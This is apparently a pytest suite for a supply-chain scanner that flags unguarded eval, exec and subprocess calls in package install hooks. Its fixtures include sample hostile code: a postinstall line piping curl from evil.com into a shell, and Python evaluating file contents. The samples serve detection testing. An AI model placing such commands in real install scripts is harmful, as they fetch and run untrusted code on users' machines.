"""Tests for hook_guard_analysis — sink/guard analysis of hook payloads."""

import pytest

from packages.sca.supply_chain.hook_guard_analysis import (
    HookGuardAnalysis,
    HookSinkInfo,
    analyze_hook_payload,
    analyze_intree_targets,
)


def _ts_available() -> bool:
    try:
        import tree_sitter  # noqa: F401
        return True
    except ImportError:
        return False


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------


class TestHookGuardAnalysis:
    def test_properties_unconditional(self):
        a = HookGuardAnalysis(
            file_path="scripts/install.py",
            language="python",
            total_sinks=2,
            unconditional_sinks=1,
            guarded_sinks=1,
        )
        assert a.has_unconditional_dangerous_call
        assert not a.all_sinks_guarded

    def test_properties_all_guarded(self):
        a = HookGuardAnalysis(
            file_path="scripts/install.py",
            language="python",
            total_sinks=2,
            unconditional_sinks=0,
            guarded_sinks=2,
        )
        assert not a.has_unconditional_dangerous_call
        assert a.all_sinks_guarded

    def test_properties_no_sinks(self):
        a = HookGuardAnalysis(
            file_path="scripts/banner.py",
            language="python",
            total_sinks=0,
            unconditional_sinks=0,
            guarded_sinks=0,
        )
        assert not a.has_unconditional_dangerous_call
        assert not a.all_sinks_guarded

    def test_to_dict(self):
        a = HookGuardAnalysis(
            file_path="install.py",
            language="python",
            total_sinks=1,
            unconditional_sinks=1,
            guarded_sinks=0,
            sinks=[HookSinkInfo(
                sink_api="eval",
                line=5,
                unconditional=True,
                guard_count=0,
                adequacy_verdict="insufficient",
            )],
        )
        d = a.to_dict()
        assert d["total_sinks"] == 1
        assert d["has_unconditional_dangerous_call"] is True
        assert len(d["sinks"]) == 1
        assert d["sinks"][0]["sink_api"] == "eval"


# ---------------------------------------------------------------------------
# analyze_hook_payload
# ---------------------------------------------------------------------------


class TestAnalyzeHookPayload:
    def test_unsupported_language(self):
        result = analyze_hook_payload("echo hello", "install.sh")
        assert result is None

    @pytest.mark.skipif(
        not _ts_available(), reason="tree-sitter not installed",
    )
    def test_python_unconditional_eval(self):
        source = (
            "import os\n"
            "data = open('payload.txt').read()\n"
            "eval(data)\n"
        )
        result = analyze_hook_payload(source, "install.py")
        assert result is not None
        assert result.total_sinks >= 1
        uncond = [s for s in result.sinks if s.unconditional]
        assert len(uncond) >= 1

    @pytest.mark.skipif(
        not _ts_available(), reason="tree-sitter not installed",
    )
    def test_python_guarded_eval(self):
        source = (
            "import os\n"
            "if os.environ.get('ALLOW_EVAL'):\n"
            "    eval(open('payload.txt').read())\n"
        )
        result = analyze_hook_payload(source, "install.py")
        assert result is not None
        eval_sinks = [s for s in result.sinks if s.sink_api == "eval"]
        if eval_sinks:
            assert not eval_sinks[0].unconditional
            assert eval_sinks[0].guard_count >= 1

    @pytest.mark.skipif(
        not _ts_available(), reason="tree-sitter not installed",
    )
    def test_python_no_sinks(self):
        source = "print('Installing...')\nx = 1 + 2\n"
        result = analyze_hook_payload(source, "install.py")
        assert result is not None
        assert result.total_sinks == 0

    @pytest.mark.skipif(
        not _ts_available(), reason="tree-sitter not installed",
    )
    def test_javascript_exec(self):
        source = (
            "const { exec } = require('child_process');\n"
            "exec('curl http://evil.com | sh');\n"
        )
        result = analyze_hook_payload(source, "postinstall.js")
        assert result is not None
        assert result.total_sinks >= 1

    @pytest.mark.skipif(
        not _ts_available(), reason="tree-sitter not installed",
    )
    def test_custom_sink_names(self):
        source = "my_custom_sink('danger')\n"
        result = analyze_hook_payload(
            source, "install.py",
            sink_names=frozenset({"my_custom_sink"}),
        )
        assert result is not None
        if result.total_sinks > 0:
            assert result.sinks[0].sink_api == "my_custom_sink"


# ---------------------------------------------------------------------------
# analyze_intree_targets
# ---------------------------------------------------------------------------


class TestAnalyzeIntreeTargets:
    @pytest.mark.skipif(
        not _ts_available(), reason="tree-sitter not installed",
    )
    def test_reads_and_analyzes(self, tmp_path):
        script = tmp_path / "scripts" / "install.py"
        script.parent.mkdir()
        script.write_text(
            "import subprocess\n"
            "subprocess.call(['curl', 'http://evil.com'])\n",
        encoding="utf-8",
        )

        class FakeTarget:
            path = "scripts/install.py"
            is_executable_payload = False

        results = analyze_intree_targets([FakeTarget()], tmp_path)
        assert len(results) >= 1
        assert results[0].total_sinks >= 1

    def test_missing_file(self, tmp_path):
        class FakeTarget:
            path = "nonexistent.py"
            is_executable_payload = False

        results = analyze_intree_targets([FakeTarget()], tmp_path)
        assert results == []


__all__: list = []
